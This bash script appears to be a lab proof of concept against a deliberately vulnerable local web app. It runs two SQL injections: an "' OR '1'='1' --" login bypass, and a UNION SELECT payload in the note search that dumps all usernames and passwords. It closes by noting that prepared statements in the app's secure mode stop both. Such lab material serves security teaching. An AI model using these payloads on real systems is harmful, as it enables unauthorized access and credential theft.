#!/usr/bin/env bash
# Vuln #2 — SQL injection. Logs in as the first user WITHOUT a valid password,
# then dumps every username+password via a UNION in the note search.
# Works on VULN mode (http://localhost:3000); FAILS on SECURE mode.
set -euo pipefail
BASE="${1:-http://localhost:3000}"
CURL="curl -sk"

echo "== 1. auth bypass: login with  ' OR '1'='1' --"
$CURL -X POST "$BASE/api/login" -H 'Content-Type: application/json' \
  --data-raw "{\"username\":\"x' OR '1'='1' -- \",\"password\":\"irrelevant\"}"
echo

echo "== 2. dump all credentials via UNION in search"
SID=$($CURL -i -X POST "$BASE/api/login" -H 'Content-Type: application/json' \
  --data-raw '{"username":"alice","password":"alicepass"}' \
  | grep -i set-cookie | sed 's/.*sid=\([^;]*\).*/\1/' | tr -d '\r')
# q closes the LIKE string, UNIONs user rows into the note result set
PAYLOAD="x%' UNION SELECT id, username, password FROM users -- "
$CURL -G "$BASE/api/notes" --data-urlencode "q=$PAYLOAD" -H "Cookie: sid=$SID"
echo
echo "(SECURE mode returns [] / bad credentials — prepared statements neutralise both)"
